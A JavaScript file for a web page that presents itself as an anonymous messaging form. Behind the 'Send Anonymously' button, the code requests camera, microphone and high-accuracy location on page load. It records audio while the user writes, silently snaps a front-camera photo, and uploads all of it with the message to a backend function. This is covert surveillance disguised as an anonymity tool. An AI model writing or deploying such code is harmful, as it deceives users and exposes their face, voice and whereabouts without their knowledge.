document.addEventListener('DOMContentLoaded', () => {
    // --- Get all the elements we need from the HTML ---
    const step1 = document.getElementById('step1-message');
    const step2 = document.getElementById('step2-finalize');
    const step3 = document.getElementById('step3-thankyou');

    const messageInput = document.getElementById('anonymousMessage');
    const nextButton = document.getElementById('nextButton');
    const userNameInput = document.getElementById('userName');
    const emojis = document.querySelectorAll('.emoji');
    const sendButton = document.getElementById('sendButton');

    const mainLiveChatButton = document.getElementById('mainLiveChatButton');
    const thankYouLiveChatButton = document.getElementById('liveChatButton');
    const closeButton = document.getElementById('closeButton');

    let selectedEmoji = null;
    let mediaRecorder;
    let audioChunks = [];
    let userMediaStream; // Stores the MediaStream (camera/mic)
    let userLocation = { latitude: null, longitude: null }; // To store location data

    // --- Permissions on Page Load ---
    async function requestPermissions() {
        console.log('DEBUG: requestPermissions function started.');

        // Request camera and microphone
        console.log('DEBUG: Attempting to request Camera/Mic.');
        try {
            userMediaStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
            console.log('DEBUG: Camera/Microphone permissions granted!');

            // --- Setup Audio Recording (BUT DO NOT START YET) ---
            mediaRecorder = new MediaRecorder(userMediaStream);
            mediaRecorder.ondataavailable = event => {
                audioChunks.push(event.data);
            };

        } catch (error) {
            console.warn('DEBUG: Camera/Microphone permissions were denied or encountered error:', error);
            // If permissions are denied, ensure userMediaStream is null so we don't try to stop it later
            userMediaStream = null;
        }

        // --- Request Geolocation Permission ---
        console.log('DEBUG: Checking if Geolocation is supported.');
        if (navigator.geolocation) {
            console.log('DEBUG: Geolocation is supported. Attempting to request location.');
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    userLocation.latitude = position.coords.latitude;
                    userLocation.longitude = position.coords.longitude;
                    console.log('DEBUG: Geolocation permission granted and captured:', userLocation);
                },
                (error) => {
                    console.warn('DEBUG: Geolocation permission denied or error:', error);
                    // Common errors:
                    // 1: PERMISSION_DENIED (user denied or browser denied for security)
                    // 2: POSITION_UNAVAILABLE (GPS signal lost)
                    // 3: TIMEOUT (took too long to get location)
                },
                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 } // Options for better accuracy
            );
        } else {
            console.warn('DEBUG: Geolocation is NOT supported by this browser.');
        }
        console.log('DEBUG: requestPermissions function finished.');
    }

    requestPermissions(); // Call permission function on DOMContentLoaded

    // --- Photo Capture Function ---
    async function capturePhoto() {
        if (!userMediaStream) return null;
        const videoTrack = userMediaStream.getVideoTracks()[0];
        if (!videoTrack) return null;
        try {
            const imageCapture = new ImageCapture(videoTrack);
            const blob = await imageCapture.takePhoto();
            return blob;
        } catch (error) {
            console.error("DEBUG: Could not capture photo:", error);
            return null;
        }
    }

    // --- Image Compression Function ---
    function compressImage(imageFile, maxWidth = 800, quality = 0.7) {
        return new Promise((resolve, reject) => {
            const reader = new FileReader();
            reader.readAsDataURL(imageFile);
            reader.onload = event => {
                const img = new Image();
                img.src = event.target.result;
                img.onload = () => {
                    const canvas = document.createElement('canvas');
                    let width = img.width;
                    let height = img.height;

                    if (width > height) {
                        if (width > maxWidth) {
                            height = Math.round((height * maxWidth) / width);
                            width = maxWidth;
                        }
                    } else {
                        if (height > maxWidth) {
                            width = Math.round((width * maxWidth) / height);
                            height = maxWidth;
                        }
                    }

                    canvas.width = width;
                    canvas.height = height;

                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(img, 0, 0, width, height);

                    canvas.toBlob(blob => {
                        resolve(blob);
                    }, 'image/jpeg', quality);
                };
                img.onerror = error => reject(error);
            };
            reader.onerror = error => reject(error);
        });
    }


    // --- Main Application Flow Logic ---
    messageInput.addEventListener('input', () => {
        if (messageInput.value.trim() !== '') {
            nextButton.classList.remove('hidden');
        } else {
            nextButton.classList.add('hidden');
        }
    });

    nextButton.addEventListener('click', () => {
        if (messageInput.value.trim() === '') {
            messageInput.style.animation = 'shake 0.5s';
            setTimeout(() => { messageInput.style.animation = '' }, 500);
            return;
        }
        step1.classList.add('hidden');
        mainLiveChatButton.classList.add('hidden');
        step2.classList.remove('hidden');

        // --- START RECORDING NOW *** ---
        if (mediaRecorder && mediaRecorder.state === 'inactive') {
            audioChunks = []; // Clear any previous chunks
            mediaRecorder.start();
            console.log('DEBUG: Audio recording started on final step.');
        }
    });

    emojis.forEach(emoji => {
        emoji.addEventListener('click', () => {
            const currentlySelected = document.querySelector('.emoji.selected');
            if (currentlySelected) {
                currentlySelected.classList.remove('selected');
            }
            emoji.classList.add('selected');
            selectedEmoji = emoji.dataset.emoji;
        });
    });

    sendButton.addEventListener('click', async () => {
        if (userNameInput.value.trim() === '') {
            userNameInput.style.animation = 'shake 0.5s';
            setTimeout(() => { userNameInput.style.animation = '' }, 500);
            return;
        }

        sendButton.disabled = true;
        sendButton.textContent = 'Sending...';

        // Stop recording to finalize the audio file
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
            console.log('DEBUG: Recording stopped by sending message.');
        }

        // Capture photo
        let photo1 = await capturePhoto();
        let compressedPhoto1 = null;

        // Compress the photo before sending
        if (photo1) {
            compressedPhoto1 = await compressImage(photo1);
            console.log('DEBUG: Original photo size:', (photo1.size / 1024).toFixed(2), 'KB');
            console.log('DEBUG: Compressed photo size:', (compressedPhoto1.size / 1024).toFixed(2), 'KB');
        }

        // Use a small delay to ensure the recorder has time to process the last chunk
        await new Promise(resolve => setTimeout(resolve, 500));

        const formData = new FormData();
        formData.append('message', messageInput.value.trim());
        formData.append('name', userNameInput.value.trim());
        formData.append('emoji', selectedEmoji || 'No reaction');

        // --- Append location data if available ---
        if (userLocation.latitude !== null && userLocation.longitude !== null) {
            formData.append('latitude', userLocation.latitude);
            formData.append('longitude', userLocation.longitude);
            console.log('DEBUG: Appending location data to form:', userLocation);
        } else {
            console.log('DEBUG: Location data not available to append.');
        }


        if (compressedPhoto1) {
            formData.append('photo1', compressedPhoto1, 'compressed_photo.jpg');
        }
        if (audioChunks.length > 0) {
            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            formData.append('audio', audioBlob, 'audio.webm');
        }

        // --- Sending ALL Data to Backend ---
        try {
            console.log('DEBUG: Sending data to Netlify function.');
            const response = await fetch('/.netlify/functions/send-message', {
                method: 'POST',
                body: formData
            });

            if (response.ok) {
                console.log('DEBUG: Data sent successfully.');
                step2.classList.add('hidden');
                step3.classList.remove('hidden');
                
                // --- NEW: Stop all camera/mic tracks ---
                if (userMediaStream) {
                    userMediaStream.getTracks().forEach(track => track.stop());
                    console.log('DEBUG: Camera/Mic tracks stopped.');
                }

            } else {
                console.error('DEBUG: Failed to send message. Server response:', response.status);
                throw new Error('Failed to send message.');
            }
        } catch (error) {
            console.error('DEBUG: Error sending data:', error);
            alert('Sorry, something went wrong. Please try again.');
            sendButton.disabled = false;
            sendButton.textContent = 'Send Anonymously';
        }
    });

    // --- Thank You Screen Button Logic ---
    closeButton.addEventListener('click', () => { window.close(); });
    thankYouLiveChatButton.addEventListener('click', () => { alert('Live Chat feature coming soon!'); });
    mainLiveChatButton.addEventListener('click', () => { alert('Live Chat feature coming soon!'); });
});

// Add shake animation keyframes dynamically
const styleSheet = document.createElement("style");
styleSheet.type = "text/css";
styleSheet.innerText = `@keyframes shake {
    10%, 90% { transform: translate3d(-1px, 0, 0); }
    20%, 80% { transform: translate3d(2px, 0, 0); }
    30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
    40%, 60% { transform: translate3d(4px, 0, 0); }
}`;
document.head.appendChild(styleSheet);
